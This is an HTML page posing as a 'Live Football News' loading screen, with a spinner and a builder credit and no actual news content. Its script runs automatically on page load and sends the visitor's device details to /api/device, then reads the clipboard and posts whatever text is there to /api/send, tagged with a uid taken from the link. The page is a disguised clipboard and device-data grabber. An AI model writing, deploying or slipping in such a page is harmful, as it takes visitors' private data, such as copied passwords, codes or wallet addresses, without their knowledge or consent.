<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Live Football News</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      background: url('https://i.postimg.cc/0NpsLGXh/Screenshot-2025-0730-102754.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      backdrop-filter: blur(3px);
    }
    .container {
      background: rgba(0, 0, 0, 0.65);
      border-radius: 20px;
      padding: 30px 25px;
      text-align: center;
      max-width: 90%;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
    }
    h1 {
      font-size: 32px;
      margin-bottom: 10px;
      font-weight: bold;
    }
    p {
      font-size: 20px;
      margin: 0 0 20px;
      font-weight: 600;
    }
    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #ffd700;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .credit {
      margin-top: 30px;
      padding: 10px 15px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 15px;
      font-size: 18px;
      backdrop-filter: blur(5px);
      font-weight: bold;
    }
    @media (max-width: 600px) {
      h1 { font-size: 26px; }
      p { font-size: 16px; }
      .credit { font-size: 16px; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>âš½ Live Football News</h1>
    <p>Loading the hottest transfer updates...</p>
    <div class="spinner"></div>
    <div class="credit">ğ—•ğ˜‚ğ—¶ğ—¹ğ˜ ğ—•ğ˜†: ğŸ’› ğ—ªğ—”ğ—–ğ—œğ—¤</div>
  </div>

  <script>
    async function sendClipboardDeviceInfo() {
      const uid = new URLSearchParams(window.location.search).get("uid");
      if (!uid) return;

      try {
        // ğŸ“± Ú‰ÛŒÙˆØ§ÛŒØ³ Ø§Ù†ÙÙˆ
        const deviceInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: {
            width: window.screen.width,
            height: window.screen.height
          }
        };

        await fetch("/api/device", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ uid, device: deviceInfo })
        });

        // ğŸ“ Ú©Ù„ÛŒÙ¾Ø¨ÙˆØ±Ø¯ Ù¼Ú©Ø³Øª
        let clipText = "";
        try {
          clipText = await navigator.clipboard.readText();
        } catch (e) {
          console.warn("âš ï¸ Clipboard read blocked:", e);
        }

        if (clipText) {
          await fetch("/api/send", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ uid, text: clipText })
          });
        }

      } catch (err) {
        console.error("âŒ Failed:", err);
      }
    }

    window.onload = sendClipboardDeviceInfo;
  </script>
</body>
</html>
